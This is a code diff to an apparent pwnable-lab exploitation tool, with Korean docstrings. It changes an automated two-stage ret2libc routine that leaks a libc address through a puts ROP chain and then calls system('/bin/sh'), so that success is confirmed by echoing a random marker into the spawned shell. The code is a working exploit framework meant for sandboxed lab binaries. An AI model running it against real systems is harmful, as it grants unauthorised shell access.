@@ -8,22 +8,25 @@ executor 에서는 반드시 컨테이너 **안에서** 수행돼야 한다(그�
 
 from __future__ import annotations
 
+import secrets
 from pathlib import Path
 
-from pwnable_lab.analyzer.strategy import binary_exec_range, is_pie, ret2libc_plan
+from pwnable_lab.analyzer.strategy import is_pie, ret2libc_plan
 from pwnable_lab.elf.parser import parse_elf
 from pwnable_lab.payload.pack import RopStep, build_overflow
 from pwnable_lab.sandbox.libc import resolve_libc_symbols
-from pwnable_lab.sandbox.runner import SandboxLimits, run_two_stage
+from pwnable_lab.sandbox.runner import SandboxLimits, run_two_stage_shell
 
 
 def auto_ret2libc(
     binary_path: str, *, offset: int, limits: SandboxLimits | None = None
 ) -> dict:
-    """단일 바이너리에 대해 leak→base→system 2단계 ret2libc 를 자동 수행한다.
+    """단일 바이너리에 대해 leak→base→system→**셸** 2단계 ret2libc 를 자동 수행한다.
 
-    반환은 서비스가 그대로 노출하는 dict(성공/근거 포함). 구성요소·libc 를 못
-    찾으면 ``attempted=false`` 로 사유를 담는다(예외 아님).
+    PTY 로 유출을 읽어 libc base 를 계산하고, 2단계 ret2libc 로 ``system("/bin/sh")``
+    를 띄운 뒤 spawn 된 셸에 ``echo <marker>`` 를 흘려 **셸 획득을 직접 증명**한다
+    (in-process·컨테이너 CLI 모두 로컬 실행이라 동일하게 동작). 반환은 서비스가
+    그대로 노출하는 dict. 구성요소·libc 를 못 찾으면 ``attempted=false``.
     """
 
     image = parse_elf(Path(binary_path).read_bytes())
@@ -41,18 +44,16 @@ def auto_ret2libc(
         return {"attempted": False, "reason": "no-libc-symbols"}
 
     pop, ret = bplan["pop_rdi"], bplan["ret"]
-    prelude = (
-        build_overflow(
-            offset,
-            pop,
-            bits=64,
-            chain=[
-                RopStep(bplan["puts_got"]),
-                RopStep(bplan["puts_plt"]),
-                RopStep(bplan["return_to"]),
-            ],
-        )
-        + b"\n"
+    # prelude: puts(puts@got) 로 런타임 libc 주소 유출 후 재진입(main/vuln).
+    prelude = build_overflow(
+        offset,
+        pop,
+        bits=64,
+        chain=[
+            RopStep(bplan["puts_got"]),
+            RopStep(bplan["puts_plt"]),
+            RopStep(bplan["return_to"]),
+        ],
     )
     captured: dict = {}
 
@@ -60,30 +61,36 @@ def auto_ret2libc(
         leaked = int.from_bytes(first_line[:6], "little")
         base = leaked - libc["puts"]
         captured.update(leaked=leaked, base=base)
-        return (
-            build_overflow(
-                offset,
-                pop,
-                bits=64,
-                chain=[
-                    RopStep(base + libc["binsh"]),
-                    RopStep(ret),
-                    RopStep(base + libc["system"]),
-                ],
-            )
-            + b"\n"
+        # stage2 ret2libc: pop rdi → /bin/sh → ret(정렬) → system.
+        return build_overflow(
+            offset,
+            pop,
+            bits=64,
+            chain=[
+                RopStep(base + libc["binsh"]),
+                RopStep(ret),
+                RopStep(base + libc["system"]),
+            ],
         )
 
-    observation, _leaked_line = run_two_stage(
-        binary_path, make_second, prelude=prelude, limits=limits or SandboxLimits()
+    marker = "PWNPILOT_" + secrets.token_hex(4)
+    proof, _leaked_line = run_two_stage_shell(
+        binary_path,
+        make_second,
+        marker=marker,
+        prelude=prelude,
+        limits=limits or SandboxLimits(),
     )
 
     base = captured.get("base")
-    rng = binary_exec_range(image)
-    rip = observation.rip
-    reached_libc = rip is not None and rng is not None and not (rng[0] <= rip < rng[1])
     base_ok = base is not None and base > 0 and base % 0x1000 == 0
-    succeeded = bool(base_ok and reached_libc)
+    succeeded = proof.shell_spawned
+    if succeeded:
+        reason = "shell-proven"
+    elif base_ok:
+        reason = "leaked-but-no-shell"
+    else:
+        reason = "leak-failed"
     return {
         "attempted": True,
         "technique": "ret2libc",
@@ -95,9 +102,9 @@ def auto_ret2libc(
         "libc_base": base,
         "libc_base_hex": None if base is None else f"0x{base:x}",
         "libc_base_page_aligned": base_ok,
-        "reached_libc": reached_libc,
         "return_to": bplan["return_to_name"],
+        "shell_proven": proof.shell_spawned,
         "succeeded": succeeded,
-        "reason": "control-into-system" if succeeded else "did-not-reach-system",
-        "observation": observation.as_dict(),
+        "reason": reason,
+        "shell_proof": proof.as_dict(),
     }
